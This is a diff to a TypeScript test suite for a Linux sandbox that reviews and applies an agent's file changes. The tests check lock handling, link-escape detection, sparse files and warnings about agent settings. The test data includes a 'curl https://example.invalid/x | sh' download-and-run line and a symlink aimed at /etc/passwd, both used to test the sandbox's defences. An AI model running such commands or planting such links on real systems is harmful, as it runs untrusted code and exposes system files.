@@ -3,12 +3,16 @@ import {
   chmodSync,
   constants,
   existsSync,
+  linkSync,
+  lstatSync,
   mkdirSync,
   mkdtempSync,
   readdirSync,
   realpathSync,
   statfsSync,
   statSync,
+  truncateSync,
+  utimesSync,
   writeFileSync,
 } from 'node:fs';
 import { homedir, tmpdir } from 'node:os';
@@ -18,16 +22,27 @@ import {
   type ChangesEvent,
   finishWorkspace,
 } from '../../src/cli/workspace-changes.ts';
-import type { ApplyOutcome } from '../../src/sandbox/changeset/apply.ts';
+import { type ApplyOutcome, applyChanges } from '../../src/sandbox/changeset/apply.ts';
 import { type Change, classify, GIT_NEVER_CHANGED } from '../../src/sandbox/changeset/classify.ts';
-import { close, openBeneath, openDirectory, tryLock } from '../../src/sandbox/changeset/dirfd.ts';
-import { readUpper } from '../../src/sandbox/changeset/snapshot.ts';
+import {
+  close,
+  openBeneath,
+  openDirectory,
+  setXattr,
+  tryLock,
+} from '../../src/sandbox/changeset/dirfd.ts';
+import { MAX_DEPTH, readUpper } from '../../src/sandbox/changeset/snapshot.ts';
 import {
   describeChanges,
   displayPath,
   formatApplyReport,
   formatChanges,
 } from '../../src/sandbox/changeset/summary.ts';
+import {
+  LINK_LEAVES,
+  LINK_TOO_COSTLY,
+  linksInsideProject,
+} from '../../src/sandbox/changeset/validate.ts';
 import {
   createWorkspaceDirectory,
   processStart,
@@ -103,6 +118,12 @@ describe.if(process.platform === 'linux')('the workspace directory', () => {
     mkdirSync(join(gone, 'work'));
     writeFileSync(join(gone, 'work', 'file'), 'x');
     chmodSync(join(gone, 'work'), 0o000);
+    // Left without a lock for longer than a session takes to make one.
+    const past = new Date(Date.now() - 120_000);
+    for (const dir of [gone, staging]) utimesSync(dir, past, past);
+    // One a session of another PID namespace is making right now.
+    const making = join(runtime, `nullrivet-${process.pid}-${Number(ownStart) + 2}-1.new`);
+    mkdirSync(making);
     const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
     if ('error' in created) throw new Error(created.error);
     expect(created.warnings).toEqual([]);
@@ -110,6 +131,7 @@ describe.if(process.platform === 'linux')('the workspace directory', () => {
     expect(existsSync(staging)).toBe(false);
     expect(existsSync(live)).toBe(true);
     expect(existsSync(other)).toBe(true);
+    expect(existsSync(making)).toBe(true);
   });
 
   test('keeps the directory of a session that holds its lock, whatever its process id says', () => {
@@ -189,6 +211,17 @@ describe.if(process.platform === 'linux')('the workspace directory', () => {
     expect(readdirSync(open)).toEqual([]);
   });
 
+  test('refuses a runtime directory under one that others can change', () => {
+    const shared = runtimeDir();
+    chmodSync(shared, 0o770);
+    const inner = join(shared, 'runtime');
+    mkdirSync(inner, { mode: 0o700 });
+    const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: inner });
+    expect('error' in created ? created.error : 'created').toBe(
+      `XDG_RUNTIME_DIR ${inner} is under ${shared}, which another user can change`,
+    );
+  });
+
   test.skipIf(diskBase === undefined)(
     'refuses a runtime directory on disk, where the changes would outlive a killed process',
     () => {
@@ -202,6 +235,157 @@ describe.if(process.platform === 'linux')('the workspace directory', () => {
       expect(readdirSync(disk)).toEqual([]);
     },
   );
+
+  test('refuses a directory deeper than the limit, unread', () => {
+    const upper = join(runtimeDir(), 'upper');
+    const deep = Array.from({ length: MAX_DEPTH + 2 }, () => 'd');
+    mkdirSync(join(upper, ...deep), { recursive: true });
+    let node = readUpper(upper);
+    for (let depth = 1; depth <= MAX_DEPTH; depth++) {
+      if (node.kind !== 'dir') throw new Error(`not a directory at ${depth}`);
+      node = node.children.get(Buffer.from('d').toString('hex'))?.node ?? node;
+    }
+    if (node.kind !== 'dir') throw new Error('not a directory at the limit');
+    expect(node.children.get(Buffer.from('d').toString('hex'))?.node).toEqual({
+      kind: 'other',
+      what: `a directory more than ${MAX_DEPTH} levels deep`,
+    });
+  });
+
+  test('reads no more of the changes than the storage holds: sparse files and hard links', () => {
+    const upper = join(runtimeDir(), 'upper');
+    mkdirSync(upper);
+    // Sizes the storage does not hold, each below the limit of one file.
+    for (let i = 0; i < 300; i++) {
+      writeFileSync(join(upper, `sparse-${i}`), '');
+      truncateSync(join(upper, `sparse-${i}`), 900 * 1024 * 1024);
+    }
+    // One inode under several names, read once.
+    writeFileSync(join(upper, 'data'), Buffer.alloc(16 * 1024 * 1024, 1));
+    for (let i = 0; i < 20; i++) linkSync(join(upper, 'data'), join(upper, `link-${i}`));
+    const started = performance.now();
+    const snapshot = readUpper(upper);
+    expect(performance.now() - started).toBeLessThan(3_000);
+    if (snapshot.kind !== 'dir') throw new Error('not a directory');
+    const nodes = [...snapshot.children.values()];
+    const named = (prefix: string) =>
+      nodes.filter((child) => child.name.toString().startsWith(prefix)).map((child) => child.node);
+    expect(new Set(named('sparse-').map((node) => JSON.stringify(node)))).toEqual(
+      new Set([JSON.stringify({ kind: 'other', what: 'a sparse file' })]),
+    );
+    const hashes = named('link-').map((node) => (node.kind === 'file' ? node.hash : null));
+    expect(hashes).toHaveLength(20);
+    expect(new Set(hashes).size).toBe(1);
+  }, 30_000);
+
+  test('shows the lines of the bytes it hashed, whatever the file holds when it is shown', () => {
+    const runtime = runtimeDir();
+    const project = join(runtime, 'project');
+    const upper = join(runtime, 'upper');
+    mkdirSync(project);
+    mkdirSync(upper);
+    writeFileSync(join(upper, 'run.sh'), 'curl https://example.invalid/x | sh\n');
+    const snapshot = readUpper(upper, undefined, true);
+    // A sandbox still running puts other content there before the summary is made.
+    writeFileSync(join(upper, 'run.sh'), 'echo benign\n');
+    const root = openDirectory(project);
+    try {
+      const [entry] = describeChanges(classify(snapshot, root), root);
+      expect(entry?.snippet?.map((line) => line.text)).toEqual([
+        'curl https://example.invalid/x | sh',
+      ]);
+    } finally {
+      close(root);
+    }
+  });
+
+  test('shows modes others can write, what a replaced directory held, and agent settings', () => {
+    const runtime = runtimeDir();
+    const project = join(runtime, 'project');
+    const upper = join(runtime, 'upper');
+    mkdirSync(join(project, 'src'), { recursive: true });
+    writeFileSync(join(project, 'src', 'a.ts'), 'a');
+    writeFileSync(join(project, 'src', 'b.ts'), 'bb');
+    mkdirSync(join(upper, 'open'), { recursive: true });
+    chmodSync(join(upper, 'open'), 0o777);
+    writeFileSync(join(upper, 'shared.txt'), 'x');
+    chmodSync(join(upper, 'shared.txt'), 0o666);
+    // A file where the project has a directory: the directory goes, with what it holds.
+    writeFileSync(join(upper, 'src'), 'now a file');
+    mkdirSync(join(upper, '.claude'));
+    writeFileSync(join(upper, '.claude', 'settings.json'), '{}');
+    mkdirSync(join(upper, '.vscode'));
+    writeFileSync(join(upper, '.vscode', 'tasks.json'), '{}');
+    const root = openDirectory(project);
+    try {
+      const entries = describeChanges(classify(readUpper(upper), root), root);
+      const byPath = new Map(entries.map((entry) => [entry.path, entry]));
+      expect(byPath.get('open')?.mode).toBe('777');
+      expect(byPath.get('shared.txt')?.mode).toBe('666');
+      expect(byPath.get('src')).toMatchObject({
+        change: 'replaced',
+        replaces: 'directory',
+        held: { entries: 2, bytes: 3 },
+      });
+      expect(byPath.get('.claude/settings.json')?.attention).toContain('can run commands');
+      expect(byPath.get('.vscode/tasks.json')?.attention).toContain('when the folder opens');
+      const plain = {
+        added: (text: string) => text,
+        removed: (text: string) => text,
+        attention: (text: string) => text,
+        dim: (text: string) => text,
+      };
+      expect(formatChanges(entries, plain)).toContain('replaces a directory of 2 entries, 3B');
+    } finally {
+      close(root);
+    }
+  });
+
+  test('names where the project entry is left when putting it back fails', () => {
+    const runtime = runtimeDir();
+    const project = join(runtime, 'project');
+    const upper = join(runtime, 'upper');
+    mkdirSync(project);
+    mkdirSync(upper);
+    writeFileSync(join(project, 'f'), 'project');
+    // A removal, as the overlay records it.
+    writeFileSync(join(upper, 'f'), '');
+    setXattr(join(upper, 'f'), 'user.overlay.whiteout', Buffer.alloc(0));
+    const root = openDirectory(project);
+    try {
+      const since = BigInt(Date.now() + 1_000) * 1_000_000n;
+      const outcome = applyChanges(classify(readUpper(upper), root), {
+        projectRoot: root,
+        projectPath: project,
+        upperPath: upper,
+        since,
+        step: (step) => {
+          if (step !== 'moved') return;
+          // The host changes the entry once it is out of its path, and makes another there.
+          const hidden = readdirSync(project).find((name) => name.startsWith('.nullrivet-trash-'));
+          chmodSync(join(project, hidden ?? ''), 0o600);
+          writeFileSync(join(project, 'f'), 'host');
+        },
+      });
+      const hidden = readdirSync(project).find((name) => name.startsWith('.nullrivet-trash-'));
+      expect(hidden).toBeDefined();
+      expect(outcome.stopped?.reason).toContain(`it is left as ${hidden} in the same directory`);
+    } finally {
+      close(root);
+    }
+  });
+
+  test('stops at names whose files hold more than the storage, as the application would copy', () => {
+    const upper = join(runtimeDir(), 'upper');
+    mkdirSync(upper);
+    const size = 64 * 1024 * 1024;
+    writeFileSync(join(upper, 'data'), Buffer.alloc(size, 1));
+    const storage = Number(statfsSync(upper).blocks * statfsSync(upper).bsize);
+    for (let i = 0; i <= Math.ceil(storage / size); i++) {
+      linkSync(join(upper, 'data'), join(upper, `link-${i}`));
+    }
+    expect(() => readUpper(upper)).toThrow('counting each name of a file');
+  }, 30_000);
 
   test('fails a run whose changes cannot be read, with or without --apply', () => {
     const runtime = runtimeDir();
@@ -248,7 +432,7 @@ describe.if(process.platform === 'linux')('the workspace directory', () => {
     try {
       const changes = classify(readUpper(upper), root);
       const counted = (limits: { bytes: number; steps: number }) =>
-        describeChanges(changes, root, upper, limits).map((entry) => [
+        describeChanges(changes, root, limits).map((entry) => [
           entry.path,
           entry.lines ?? entry.uncompared,
         ]);
@@ -278,10 +462,7 @@ describe.if(process.platform === 'linux')('the workspace directory', () => {
         attention: (text: string) => text,
         dim: (text: string) => text,
       };
-      const text = formatChanges(
-        describeChanges(changes, root, upper, { bytes: 1, steps: 1 }),
-        plain,
-      );
+      const text = formatChanges(describeChanges(changes, root, { bytes: 1, steps: 1 }), plain);
       expect(text).toContain('  modified a.txt  12B\n');
       expect(text).toContain('  modified b.txt  12B\n');
       expect(text).toContain('The lines of 2 files were not counted');
@@ -289,6 +470,84 @@ describe.if(process.platform === 'linux')('the workspace directory', () => {
       close(root);
     }
   });
+});
+
+// A link under /usr on this host that leads out of it, as Debian's /usr/lib/ssl/certs does.
+const systemLinkOut = [
+  '/usr/lib/ssl/certs',
+  '/usr/lib/ssl/private',
+  '/usr/lib/ssl/openssl.cnf',
+  '/usr/lib/libreoffice/program/bootstraprc',
+  '/usr/tmp',
+].find((path) => {
+  try {
+    return lstatSync(path).isSymbolicLink() && !realpathSync(path).startsWith('/usr/');
+  } catch {
+    return false;
+  }
+});
+
+describe.if(process.platform === 'linux')('the links of the changes', () => {
+  const check = (project: string, links: Record<string, string>) => {
+    const root = openDirectory(project);
+    try {
+      return linksInsideProject(
+        Object.entries(links).map(([name, target]) => ({
+          op: 'symlink' as const,
+          path: [Buffer.from(name)],
+          target: Buffer.from(target),
+        })),
+        root,
+        project,
+      ).map((change) => [change.path.toString(), change.op === 'refuse' ? change.reason : 'kept']);
+    } finally {
+      close(root);
+    }
+  };
+
+  test('refuses a link that goes on past a part that is absent or not a directory', () => {
+    const project = runtimeDir();
+    mkdirSync(join(project, 'sub'));
+    writeFileSync(join(project, 'file.txt'), 'x');
+    expect(
+      check(project, {
+        // A later application of `missing -> /usr/` would make it lead to /etc/passwd.
+        through: 'missing/../etc/passwd',
+        file: 'file.txt/../sub',
+        last: 'sub/not-yet',
+        plain: 'file.txt',
+      }),
+    ).toEqual([
+      ['through', LINK_LEAVES],
+      ['file', LINK_LEAVES],
+      ['last', 'kept'],
+      ['plain', 'kept'],
+    ]);
+  });
+
+  test('stops resolving links once they took too many steps', () => {
+    const project = runtimeDir();
+    mkdirSync(join(project, 'sub'));
+    // Each target, as long as a link's can be, looks `sub` up again and again.
+    const target = `${'sub/../'.repeat(580)}sub`;
+    const verdicts = check(
+      project,
+      Object.fromEntries(Array.from({ length: 2_000 }, (_, i) => [`link-${i}`, target])),
+    );
+    expect(verdicts[0]).toEqual(['link-0', 'kept']);
+    expect(verdicts.at(-1)).toEqual(['link-1999', LINK_TOO_COSTLY]);
+  }, 60_000);
+
+  test.skipIf(systemLinkOut === undefined)(
+    'refuses a link to /usr that resolves out of it on the host',
+    () => {
+      const project = runtimeDir();
+      expect(check(project, { out: systemLinkOut as string, env: '/usr/bin/env' })).toEqual([
+        ['out', LINK_LEAVES],
+        ['env', 'kept'],
+      ]);
+    },
+  );
 });
 
 describe('the summary of the changes', () => {
@@ -304,6 +563,10 @@ describe('the summary of the changes', () => {
   test('shows a byte order mark and other invisible characters, so two names never look the same', () => {
     expect(displayPath([Buffer.from('\ufeffpackage.json')])).toBe('\\u{feff}package.json');
     expect(displayPath([Buffer.from('package\u200b.json')])).toBe('package\\u{200b}.json');
+    // Tag characters, a variation selector, a filler, a grapheme joiner and a line separator.
+    expect(displayPath([Buffer.from('a\u{e0041}b\ufe0fc\u3164d\u034fe\u2028f')])).toBe(
+      'a\\u{e0041}b\\u{fe0f}c\\u{3164}d\\u{34f}e\\u{2028}f',
+    );
     expect(displayPath([Buffer.from('package.json')])).toBe('package.json');
   });
 
